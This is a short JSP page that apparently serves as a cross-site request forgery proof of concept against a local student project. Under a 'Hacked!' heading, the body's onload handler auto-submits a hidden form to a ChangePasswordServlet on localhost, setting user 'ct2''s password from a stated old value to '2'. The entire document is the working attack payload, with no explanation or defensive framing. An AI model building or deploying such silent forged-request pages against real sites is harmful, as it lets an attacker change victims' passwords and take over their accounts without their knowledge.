<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<html>
  <body onload="document.forms[0].submit()">
    <h2>Hacked! 😈</h2>
    <form action="http://localhost:8080/Project_Web/ChangePasswordServlet" method="POST">
      <input type="hidden" name="username" value="ct2">
      <input type="hidden" name="oldPassword" value="hacked@123456"> 
      <input type="hidden" name="newPassword" value="2">
    </form>
  </body>
</html>